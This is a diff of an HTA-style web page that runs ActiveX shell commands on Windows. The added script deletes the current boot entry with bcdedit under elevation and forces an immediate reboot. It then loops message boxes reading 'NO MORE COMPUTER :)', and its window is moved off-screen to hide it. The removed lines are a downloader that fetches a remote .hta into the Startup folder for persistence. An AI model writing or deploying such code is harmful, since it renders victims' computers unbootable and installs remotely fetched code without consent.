@@ -18,24 +18,12 @@
 <p>CLICK THIS BUTTON TO DESTROY THE BOOT CONFIG DATA. THIS WILL DESTORY YOUR PC.</p>
 <dont>(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()</dont>
 <script>
-      var s=new ActiveXObject('Shell.Application');s.ShellExecute('msg','* NO RATS ALLOWED ON VM1','');
+      var s=new ActiveXObject('Shell.Application')
+      s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);
+      while(true){s.ShellExecute('msg','* NO MORE COMPUTER :)','')}
 </script>
 <script>
-var shell   = new ActiveXObject("WScript.Shell");
-var fso     = new ActiveXObject("Scripting.FileSystemObject");
-var startup = shell.SpecialFolders("Startup");
-var path    = "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/q.hta"
-var url     = 'https://emddit.github.io/mshta';
-var x       = new ActiveXObject('MSXML2.XMLHTTP');
-x.open('GET', url, false);
-x.send();
-var s=new ActiveXObject('ADODB.Stream');
-s.Type=1;
-s.Open();
-s.Write(x.responseBody);
-s.SaveToFile(path,2);
-close();
-
+      
 </script>
 <script>window.moveTo(-3000, -3000);</script>
 </body>  
